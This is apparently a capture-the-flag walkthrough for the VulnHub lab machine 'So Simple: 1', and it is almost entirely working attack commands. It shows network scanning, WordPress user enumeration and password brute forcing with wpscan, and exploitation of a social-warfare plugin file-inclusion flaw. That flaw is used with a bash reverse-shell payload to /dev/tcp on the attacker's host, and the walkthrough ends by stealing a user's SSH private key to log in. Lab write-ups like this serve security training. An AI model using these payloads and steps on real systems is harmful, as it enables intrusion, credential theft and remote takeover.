:::::::::::::::::::::::::: page
# So Simple: 1 {#so-simple-1 .title}

\

## 

## So Simple: 1

- **[So Simple: 1]{style="color:#cdab8f;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/so-simple-1,515/>

![](795-1.png)

- Now extract the file :

::: codebox
    7z e So-Simple-1.7z
:::

![](795-2.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#986a44;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](795-3.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.108
:::

![](795-4.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.108
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.108  
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.108
:::

![](795-5.png)

1.  [Web Enumeration]{style="color:#986a44;"} :

- IP visit in browser : <http://192.168.2.108>
  <http://192.168.2.108/wordpress/>
  <http://192.168.2.108/wordpress/wp-login.php>

<!-- -->

- User enumeration with wpscan :

::: codebox
    wpscan --url http://192.168.2.108/wordpress -e u
:::

![](795-6.png) Found the user .

- If not show the output then update the wpscan .

<!-- -->

- Password brute force :

::: codebox
    wpscan --url http://192.168.2.108/wordpress -U admin,max -P /opt/rockyou.txt -t 50
:::

![](795-7.png)

- Now login wordpress :

::: codebox
    Username : max
    Password : opensesame
:::

![](795-8.png)

- Search the social-warfare version in browser :
  <https://www.exploit-db.com/exploits/46794>

<!-- -->

- Download the exploit :

![](795-9.png)

- After download read the content in file :

::: codebox
    cat 46794.py
:::

![](795-10.png)

- Visit the path in browser :

::: codebox
    http://192.168.2.108/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s
:::

![](795-11.png)

1.  [Reverse shell]{style="color:#986a44;"} :

- Create a file shell.txt :

::: codebox
    nano shell.txt
:::

- Add the reverse shell content :

::: codebox
    <pre>system("bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'")</pre>
:::

- 

![](795-12.png)

- Start the python server :

::: codebox
    python3 -m http.server 80
:::

- Start the listener :

::: codebox
    nc -nlvp 443
:::

- Call the vulnpath with the server ip :

::: codebox
    http://192.168.2.108/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.2.219/shell.txt
:::

- Get the reverse shell :

![](795-13.png)

1.  [SSH Connection]{style="color:#986a44;"} :

- Exit the directory .

<!-- -->

- Navigate the home directory :

::: codebox
    cd /home
:::

- 

::: codebox
    cd max
:::

- 

::: codebox
    cd .ssh
:::

![](795-14.png)

- Check the id_rsa file :

::: codebox
    cat id_rsa
:::

![](795-15.png)

- Make a file and place the rsa key :

::: codebox
    nano id_rsa
:::

![](795-16.png)

- Get the permission :

::: codebox
    chmod 600 id_rsa
:::

- For SSH connection command :

::: codebox
    ssh -i id_rsa max@192.168.2.108
:::

![](795-17.png)
::::::::::::::::::::::::::
